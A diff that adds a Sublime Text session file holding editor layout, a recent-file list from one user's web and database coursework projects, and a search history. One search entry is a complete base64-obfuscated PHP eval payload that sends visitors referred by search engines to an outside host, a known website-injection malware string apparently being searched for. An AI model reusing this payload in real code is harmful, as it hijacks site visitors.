@@ -1,0 +1,272 @@
+{
+	"auto_complete":
+	{
+		"selected_items":
+		[
+			[
+				"current",
+				"currentPageNumber"
+			],
+			[
+				"curr",
+				"currentPageNumber"
+			],
+			[
+				"select",
+				"selected_items"
+			]
+		]
+	},
+	"buffers":
+	[
+	],
+	"build_system": "",
+	"command_palette":
+	{
+		"height": 0.0,
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"console":
+	{
+		"height": 125.0
+	},
+	"distraction_free":
+	{
+		"menu_visible": true,
+		"show_minimap": false,
+		"show_open_files": false,
+		"show_tabs": false,
+		"side_bar_visible": false,
+		"status_bar_visible": false
+	},
+	"file_history":
+	[
+		"/Users/denizkahramaner/Desktop/hot/hot/manage.py",
+		"/Users/denizkahramaner/Downloads/sexy-form/index.html",
+		"/Applications/MAMP/htdocs/KnowledgeGraph/tile-data-exp.json",
+		"/Applications/MAMP/htdocs/KnowledgeGraph/new/js/parser.js",
+		"/Users/denizkahramaner/Downloads/KnowledgeGraph/new/index.html",
+		"/Users/denizkahramaner/Downloads/KnowledgeGraph/create.html",
+		"/Users/denizkahramaner/Desktop/JSON Files/Camera/tile-data-exp.json",
+		"/Users/denizkahramaner/Downloads/KnowledgeGraph 4/tile-data-exp.json",
+		"/Users/denizkahramaner/Desktop/JSON Files/multi-select.json",
+		"/Applications/MAMP/htdocs/KnowledgeGraph/new/index.html",
+		"/Applications/MAMP/htdocs/KnowledgeGraph/Parser/Source/javascripts/home_create.js",
+		"/Users/denizkahramaner/Desktop/home.json",
+		"/Users/denizkahramaner/Downloads/KnowledgeGraph 3/grid-data-exp.json",
+		"/Applications/MAMP/htdocs/KnowledgeGraph/new/js/autocreate.js",
+		"/Applications/MAMP/htdocs/new/js/autocreate.js",
+		"/Applications/MAMP/htdocs/create.html",
+		"/Applications/MAMP/htdocs/data.json",
+		"/Applications/MAMP/htdocs/tile-data-exp.json",
+		"/Users/denizkahramaner/Desktop/files/autocreate.js",
+		"/Applications/MAMP/htdocs/new/index.html",
+		"/Users/denizkahramaner/Desktop/files/index.html",
+		"/Users/denizkahramaner/Desktop/files/tile-data-exp.json",
+		"/Users/denizkahramaner/Desktop/files/css/colors/yellow.css",
+		"/Users/denizkahramaner/Downloads/data.json",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/index.html",
+		"/Users/denizkahramaner/Desktop/new_index.html",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/stylesheets/prettyPhoto.css",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/stylesheets/style_common.css",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/stylesheets/style5.css",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/stylesheets/stylehov.css",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/stylesheets/supersized.css",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/stylesheets/supersized.shutter.css",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/stylesheets/jquery.mCustomScrollbar.css",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/stylesheets/normalize.css",
+		"/Users/denizkahramaner/Downloads/themeforest-3680334-pulsar-one-page-html5-parallax-website-template/Template/stylesheets/thirdeffect.css",
+		"/Users/denizkahramaner/Library/Caches/Cleanup At Startup/com.fetchsoftworks.Fetch/Fetch Temporary Folder 22/query4.sql",
+		"/Users/denizkahramaner/Library/Caches/Cleanup At Startup/com.fetchsoftworks.Fetch/Fetch Temporary Folder 20/query2.sql",
+		"/Users/denizkahramaner/Desktop/query1.sql",
+		"/Users/denizkahramaner/Library/Caches/Cleanup At Startup/com.fetchsoftworks.Fetch/Fetch Temporary Folder 19/query1.sql",
+		"/Users/denizkahramaner/Library/Caches/Cleanup At Startup/com.fetchsoftworks.Fetch/Fetch Temporary Folder 21/query3.sql",
+		"/Users/denizkahramaner/Desktop/CS145/ebay_data/CS145 Project 2/trigger1_add.sql",
+		"/Users/denizkahramaner/Desktop/CS145/ebay_data/CS145 Project 2/trigger2_add.sql",
+		"/Users/denizkahramaner/Library/Caches/Cleanup At Startup/com.fetchsoftworks.Fetch/Fetch Temporary Folder 1/sqlitedb.php",
+		"/Users/denizkahramaner/Library/Caches/Cleanup At Startup/com.fetchsoftworks.Fetch/Fetch Temporary Folder 7/selecttime.php",
+		"/Users/denizkahramaner/Library/Caches/Cleanup At Startup/com.fetchsoftworks.Fetch/Fetch Temporary Folder 4/currtime.php",
+		"/Users/denizkahramaner/Desktop/CS145/Triggers/Triggers2.sql",
+		"/Users/denizkahramaner/Desktop/bid_unique.dat",
+		"/Users/denizkahramaner/Downloads/pa1/constraints_good.sql",
+		"/Users/denizkahramaner/Desktop/CS145/ChallengeProblems2/constraints_verify.sql",
+		"/Users/denizkahramaner/Downloads/pa1/constraints.txt",
+		"/Users/denizkahramaner/Downloads/pa1/constraints_create.sql",
+		"/Users/denizkahramaner/Downloads/pa1/time.sql",
+		"/Users/denizkahramaner/Downloads/submission_pa2/submission_pa1/pa1/time.sql",
+		"/Users/denizkahramaner/Desktop/CS145/JSON Examples/BookstoreSchema.json",
+		"/Users/denizkahramaner/Desktop/CS145/JSON Examples/Bookstore.json"
+	],
+	"find":
+	{
+		"height": 35.0
+	},
+	"find_in_files":
+	{
+		"height": 0.0,
+		"where_history":
+		[
+			"/Users/denizkahramaner/Downloads/sapphiregroup"
+		]
+	},
+	"find_state":
+	{
+		"case_sensitive": false,
+		"find_history":
+		[
+			"call to action",
+			"form",
+			"conta",
+			"form",
+			"”",
+			"“",
+			"”",
+			"“",
+			"”",
+			"“",
+			"page-portfolio",
+			"red",
+			"green",
+			"hi-icon",
+			"%;\n",
+			"background: #1ABC9C;",
+			"onclick",
+			"<img alt=\"live\" title=\"designova live\" ",
+			"title",
+			"slow internet",
+			"about",
+			"abot",
+			"menu",
+			"sleep",
+			"visibility:hidden",
+			"section10",
+			"section11",
+			"section10",
+			"section9",
+			"section2",
+			"visibi",
+			"section5",
+			"body",
+			"services",
+			"section8",
+			"about-two",
+			"quote",
+			"quote hide-for-520",
+			"insert",
+			"update",
+			"delete",
+			"when",
+			"update of",
+			"CSEE",
+			"eval(base64_decode(\"CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL2ZoamFrZmpnLmRkbnMuaW5mby8iKTsKZXhpdCgpOwp9Cn0KfQp9Cn0=\"));",
+			"1043495702",
+			"1043402767",
+			"insert",
+			"16793869821679386982",
+			"9898",
+			"1679386982",
+			"category",
+			"where",
+			"update",
+			"max",
+			"population",
+			"div",
+			"max",
+			"min",
+			"count",
+			"avg",
+			"same",
+			"@",
+			"data",
+			"[",
+			"not",
+			" or ",
+			"or",
+			"using",
+			"contains",
+			"count"
+		],
+		"highlight": true,
+		"in_selection": false,
+		"preserve_case": false,
+		"regex": false,
+		"replace_history":
+		[
+			" "
+		],
+		"reverse": false,
+		"show_context": true,
+		"use_buffer2": true,
+		"whole_word": false,
+		"wrap": true
+	},
+	"groups":
+	[
+		{
+			"sheets":
+			[
+			]
+		}
+	],
+	"incremental_find":
+	{
+		"height": 0.0
+	},
+	"input":
+	{
+		"height": 0.0
+	},
+	"layout":
+	{
+		"cells":
+		[
+			[
+				0,
+				0,
+				1,
+				1
+			]
+		],
+		"cols":
+		[
+			0.0,
+			1.0
+		],
+		"rows":
+		[
+			0.0,
+			1.0
+		]
+	},
+	"menu_visible": true,
+	"replace":
+	{
+		"height": 0.0
+	},
+	"save_all_on_build": true,
+	"select_file":
+	{
+		"height": 0.0,
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"select_project":
+	{
+		"height": 0.0,
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"show_minimap": true,
+	"show_open_files": false,
+	"show_tabs": true,
+	"side_bar_visible": true,
+	"side_bar_width": 150.0,
+	"status_bar_visible": true
+}
